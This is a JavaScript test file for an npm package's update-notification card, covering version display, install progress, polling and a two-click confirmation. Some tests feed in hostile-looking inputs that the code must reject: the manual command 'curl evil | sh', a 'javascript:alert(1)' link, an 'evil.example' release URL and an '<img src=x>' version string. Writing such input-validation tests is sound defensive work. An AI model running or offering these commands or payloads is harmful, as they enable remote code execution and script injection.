import test from 'node:test';
import assert from 'node:assert/strict';
import { buttonLabel, pollDelay, updateView } from '../static/update-model.js';
import { createUpdate, renderUpdate } from '../static/update.js';

const base = {
  enabled: true, current: '0.2.6', latest: '0.2.7', checked_at: '2026-11-20T00:00:00Z',
  update_available: true, release_url: 'https://www.npmjs.com/package/vecnet/v/0.2.7',
  one_click: true, restart: true,
};

// A minimal document, installed only while a test renders.
class El {
  constructor(tag) { this.tag = tag; this.attrs = {}; this.kids = []; this.className = ''; this.on = {}; this.hidden = false; this.classList = { add() {}, remove() {} }; }
  set textContent(v) { this.kids = [String(v)]; }
  get textContent() { return this.kids.map(k => typeof k === 'string' ? k : k.textContent).join(''); }
  setAttribute(k, v) { this.attrs[k] = String(v); }
  addEventListener(type, fn) { this.on[type] = fn; }
  append(...xs) { for (const x of xs) this.kids.push(x); }
  replaceChildren(...xs) { this.kids = []; this.append(...xs); }
}
function withDoc(fn) {
  const prev = globalThis.document;
  globalThis.document = { createElement: tag => new El(tag) };
  try { return fn(); } finally { globalThis.document = prev; }
}
const find = (el, pred, out = []) => {
  if (el instanceof El) { if (pred(el)) out.push(el); el.kids.forEach(k => find(k, pred, out)); }
  return out;
};

test('updateView shows nothing unless the hub reports a newer version', () => {
  assert.equal(updateView(null), null);
  assert.equal(updateView({ enabled: false, current: '0.2.6' }), null);
  assert.equal(updateView({ ...base, update_available: false }), null);
  assert.equal(updateView({ enabled: true, current: '0.2.6' }), null); // check never succeeded
  assert.equal(updateView({ ...base, latest: '<img src=x>' }), null);
  assert.equal(updateView({ ...base, current: 'dev' }), null);
  assert.equal(updateView('nope'), null);
});

test('updateView names both versions and the release link', () => {
  const v = updateView(base);
  assert.equal(v.title, 'Update available: 0.2.7');
  assert.equal(v.sub, "You're on 0.2.6");
  assert.equal(v.release, 'https://www.npmjs.com/package/vecnet/v/0.2.7');
  assert.equal(v.oneClick, true);
  assert.equal(buttonLabel(v), 'Update & restart');
  assert.equal(buttonLabel({ ...v, restart: false }), 'Install update');
  // Only the npm package page is linked.
  assert.equal(updateView({ ...base, release_url: 'javascript:alert(1)' }).release, '');
  assert.equal(updateView({ ...base, release_url: 'https://evil.example/vecnet/v/0.2.7' }).release, '');
});

test('updateView explains manual updates', () => {
  const v = updateView({ ...base, one_click: false, restart: false, manual_reason: 'container', manual_command: 'npm install -g vecnet@0.2.7' });
  assert.equal(v.oneClick, false);
  assert.equal(v.manual, 'npm install -g vecnet@0.2.7');
  assert.match(v.reason, /container/);
  assert.equal(updateView({ ...base, one_click: false, manual_command: 'curl evil | sh' }).manual, '');
  assert.equal(updateView({ ...base, one_click: false, manual_reason: 'made_up' }).reason, '');
});

test('updateView reports job progress, completion and failure', () => {
  const job = (state, extra = {}) => updateView({ ...base, job: { state, version: '0.2.7', started_at: 'x', ...extra } });
  assert.deepEqual([job('checking').busy, job('checking').progress], [true, 'Checking npm…']);
  assert.deepEqual([job('installing').busy, job('installing').progress], [true, 'Installing 0.2.7…']);
  assert.equal(job('restarting').progress, 'Restarting into 0.2.7…');
  assert.equal(job('installed').busy, false);
  assert.match(job('installed').note, /Restart the hub/);
  const failed = job('failed', { error: 'npm install failed; the hub keeps running 0.2.6' });
  assert.equal(failed.busy, false);
  assert.equal(failed.error, 'npm install failed; the hub keeps running 0.2.6');
  assert.match(job('failed').error, /keeps running 0.2.6/);
  assert.equal(pollDelay(job('installing')), 1500);
  assert.equal(pollDelay(updateView(base)), 600000);
  assert.equal(pollDelay(null), 600000);
});

test('renderUpdate hides when there is nothing to show', () => withDoc(() => {
  const root = new El('div');
  root.hidden = false;
  renderUpdate(root, null);
  assert.equal(root.hidden, true);
  assert.equal(root.kids.length, 0);
}));

test('renderUpdate shows the one-click button, confirmed by a second click', () => withDoc(() => {
  const root = new El('div');
  let clicks = 0;
  renderUpdate(root, updateView(base), { onUpdate: () => clicks++ });
  assert.equal(root.hidden, false);
  assert.match(root.textContent, /Update available: 0\.2\.7/);
  assert.match(root.textContent, /You're on 0\.2\.6/);
  const link = find(root, e => e.tag === 'a')[0];
  assert.equal(link.attrs.href, base.release_url);
  assert.equal(link.attrs.rel, 'noopener noreferrer');
  const btn = find(root, e => e.tag === 'button')[0];
  assert.equal(btn.textContent, 'Update & restart');
  btn.on.click();
  assert.equal(clicks, 0, 'first click only arms');
  // A poll redraw with the same state keeps the armed button.
  renderUpdate(root, updateView(base), { onUpdate: () => clicks++ });
  assert.equal(find(root, e => e.tag === 'button')[0], btn);
  btn.on.click();
  assert.equal(clicks, 1);
}));

test('renderUpdate shows manual instructions and no button without one-click', () => withDoc(() => {
  const root = new El('div');
  renderUpdate(root, updateView({ ...base, one_click: false, restart: false, manual_reason: 'not_npm_global', manual_command: 'npm install -g vecnet@0.2.7' }));
  assert.equal(find(root, e => e.tag === 'button' && e.textContent.includes('Update')).length, 0);
  assert.match(root.textContent, /How to update/);
  assert.match(root.textContent, /npm install -g vecnet@0\.2\.7/);
}));

test('renderUpdate hides the button while a job runs', () => withDoc(() => {
  const root = new El('div');
  renderUpdate(root, updateView({ ...base, job: { state: 'installing', version: '0.2.7' } }));
  assert.equal(find(root, e => e.tag === 'button').length, 0);
  assert.match(root.textContent, /Installing 0\.2\.7/);
}));

test('createUpdate polls, posts no version, and hides on errors', async t => {
  const prev = globalThis.document;
  globalThis.document = { createElement: tag => new El(tag) };
  t.after(() => { globalThis.document = prev; });
  const root = new El('div');
  const calls = [];
  let reply = base;
  const api = {
    updateStatus: async () => { calls.push('get'); if (reply instanceof Error) throw reply; return reply; },
    startUpdate: async (...args) => { calls.push(['post', args.length]); return { job: { state: 'checking' } }; },
  };
  const timers = [];
  const u = createUpdate({ api, root, setTimer: (fn, ms) => { timers.push({ fn, ms }); return timers.length; }, clearTimer: () => {} });
  await new Promise(r => setImmediate(r));
  assert.equal(root.hidden, false);
  assert.equal(timers.at(-1).ms, 600000);
  const btn = find(root, e => e.tag === 'button')[0];
  btn.on.click(); btn.on.click();
  await new Promise(r => setImmediate(r));
  await new Promise(r => setImmediate(r));
  assert.deepEqual(calls.filter(c => Array.isArray(c)), [['post', 0]]);
  reply = new Error('404');
  await u.reload();
  assert.equal(root.hidden, true);
  u.close();
  assert.equal(root.hidden, true);
});

test('createUpdate keeps one poll timer when loads overlap', async () => {
  const prev = globalThis.document;
  globalThis.document = { createElement: tag => new El(tag) };
  try {
    let resolve;
    const api = { updateStatus: () => new Promise(r => { resolve = r; }), startUpdate: async () => ({}) };
    const live = new Set();
    let n = 0;
    const u = createUpdate({ api, root: new El('div'), setTimer: () => { live.add(++n); return n; }, clearTimer: id => live.delete(id) });
    const again = u.reload(); // overlaps the first load
    resolve(base);
    await again;
    assert.equal(live.size, 1);
    u.close();
    assert.equal(live.size, 0);
  } finally { globalThis.document = prev; }
});

test('trackUpdate follows a job through the restart to the new version', async () => {
  const { trackUpdate, WATCH_MS } = await import('../static/update-model.js');
  const busy = { ...base, job: { state: 'installing', version: '0.2.7', started_at: 'x' } };
  let r = trackUpdate(null, busy, 1000);
  assert.deepEqual(r.pending, { version: '0.2.7', until: 1000 + WATCH_MS });
  assert.equal(pollDelay(r.view, !!r.pending), 1500);
  // The hub drains: reads fail. The card says it is restarting.
  r = trackUpdate(r.pending, null, 5000);
  assert.equal(r.view.title, 'Restarting into 0.2.7…');
  assert.equal(r.view.busy, true);
  assert.ok(r.pending);
  // The new process answers before it knows anything: still restarting.
  r = trackUpdate(r.pending, { enabled: true, current: '0.2.6', update_available: false }, 6000);
  assert.equal(r.view.title, 'Restarting into 0.2.7…');
  // The new process runs 0.2.7.
  r = trackUpdate(r.pending, { enabled: true, current: '0.2.7', latest: '0.2.7', update_available: false }, 7000);
  assert.equal(r.view.title, 'Updated to 0.2.7');
  assert.equal(r.pending, null);
  assert.equal(pollDelay(r.view, false), 600000);
  // Next poll: nothing to show.
  r = trackUpdate(r.pending, { enabled: true, current: '0.2.7', latest: '0.2.7', update_available: false }, 8000);
  assert.equal(r.view, null);
});

test('trackUpdate reports a failed job and a restart that never comes back', async () => {
  const { trackUpdate, WATCH_MS } = await import('../static/update-model.js');
  const pending = { version: '0.2.7', until: 1000 + WATCH_MS };
  const failed = { ...base, job: { state: 'failed', version: '0.2.7', error: 'installed vecnet-hub binary did not run; not restarting' } };
  let r = trackUpdate(pending, failed, 2000);
  assert.match(r.view.error, /did not run/);
  assert.equal(r.pending, null);
  r = trackUpdate(pending, null, 1001 + WATCH_MS);
  assert.equal(r.view.title, 'Update not confirmed');
  assert.match(r.view.error, /within 2 minutes/);
  assert.equal(r.pending, null);
});

test('createUpdate shows restarting while the hub is away, then the new version', async t => {
  const prev = globalThis.document;
  globalThis.document = { createElement: tag => new El(tag) };
  t.after(() => { globalThis.document = prev; });
  const root = new El('div');
  const replies = [
    { ...base, job: { state: 'restarting', version: '0.2.7' } },
    new Error('hub unreachable'),
    { enabled: true, current: '0.2.7', latest: '0.2.7', update_available: false },
  ];
  const delays = [];
  const api = { updateStatus: async () => { const r = replies.shift(); if (r instanceof Error) throw r; return r; }, startUpdate: async () => ({}) };
  const u = createUpdate({ api, root, setTimer: (fn, ms) => { delays.push(ms); return delays.length; }, clearTimer: () => {}, now: () => 0 });
  await new Promise(r => setImmediate(r));
  assert.match(root.textContent, /Restarting into 0\.2\.7/);
  await u.reload();
  assert.match(root.textContent, /Restarting into 0\.2\.7/);
  assert.equal(root.hidden, false);
  await u.reload();
  assert.match(root.textContent, /Updated to 0\.2\.7/);
  assert.deepEqual(delays, [1500, 1500, 600000]);
  u.close();
});
